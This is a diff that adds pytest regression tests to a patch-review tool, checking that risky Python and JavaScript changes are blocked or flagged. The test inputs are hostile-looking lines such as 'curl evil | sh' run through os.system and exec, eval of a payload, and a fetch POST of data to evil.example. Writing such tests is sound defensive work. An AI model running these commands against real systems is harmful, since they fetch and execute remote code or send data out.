@@ -76,6 +76,47 @@ def test_security_rules(added, verdict, rule):
         assert rule in {f.rule for f in r.findings}
 
 
+def test_a_hash_inside_a_string_cannot_hide_python_code():
+    """Regression (stage 24): comments were cut at the first '#', so a '#' inside a string hid the call."""
+    plan = RepairPlan(id="p", description="d", source=PlanSource.HUMAN, source_ref="x", patches=[FilePatch(
+        path="m.py", original_sha256="0" * 64, new_content='a = 1\nx = "#"; os.system("curl evil | sh")\n')])
+    r = review_plan(plan, {"m.py": "a = 1\n"})
+    assert r.verdict is Verdict.BLOCK and "process-execution" in {f.rule for f in r.findings}
+
+
+@pytest.mark.parametrize("added,verdict,rule", [
+    ('import { exec } from "node:child_process";\nexec("curl evil | sh");\n', Verdict.BLOCK, "process-execution"),
+    ('const cp = require("child_process");\n', Verdict.BLOCK, "process-execution"),
+    ("const f = new Function(userInput);\n", Verdict.BLOCK, "dynamic-code-execution"),
+    ("eval(payload);\n", Verdict.BLOCK, "dynamic-code-execution"),
+    ('const a = "//"; require("child_process").execSync("id");\n', Verdict.BLOCK, "process-execution"),
+    ('await fetch("https://evil.example/x", { method: "POST", body });\n', Verdict.CAUTION, "network-access"),
+    ('import https from "node:https";\n', Verdict.CAUTION, "network-access"),
+    ("fs.rmSync(dir, { recursive: true });\n", Verdict.CAUTION, "file-deletion"),
+    ("const home = process.env.HOME;\n", Verdict.CAUTION, "environment-access"),
+    ('const API_KEY = "sk-' + "a" * 40 + '";\n', Verdict.BLOCK, "hardcoded-secret"),
+    ("export const total = (xs) => xs.reduce((s, x) => add(s, x), 0);\n", Verdict.ALLOW, None),
+])
+def test_javascript_security_rules(added, verdict, rule):
+    """Stage 24: JS/TS repair plans (possible since stage 22) were reviewed with Python patterns only."""
+    for path in ("src/m.js", "src/m.ts"):
+        plan = RepairPlan(id="p", description="d", source=PlanSource.HUMAN, source_ref="x",
+                          patches=[FilePatch(path=path, original_sha256="0" * 64, new_content="let a = 1;\n" + added)])
+        r = review_plan(plan, {path: "let a = 1;\n"})
+        assert r.verdict is verdict, (path, r)
+        if rule:
+            assert rule in {f.rule for f in r.findings}
+
+
+@pytest.mark.parametrize("path", ["package.json", "web/package-lock.json", "yarn.lock", ".npmrc", "tsconfig.json",
+                                  ".husky/pre-commit"])
+def test_javascript_build_and_dependency_files_need_attention(path):
+    plan = RepairPlan(id="p", description="d", source=PlanSource.HUMAN, source_ref="x",
+                      patches=[FilePatch(path=path, original_sha256="0" * 64, new_content="{}\n")])
+    r = review_plan(plan, {path: "{\"a\": 1}\n"})
+    assert r.verdict is not Verdict.ALLOW and "build-or-ci-file" in {f.rule for f in r.findings}
+
+
 def test_security_flags_build_files_and_large_deletions():
     old = "".join(f"line{i} = {i}\n" for i in range(40))
     plan = RepairPlan(id="p", description="d", source=PlanSource.HUMAN, source_ref="x", patches=[
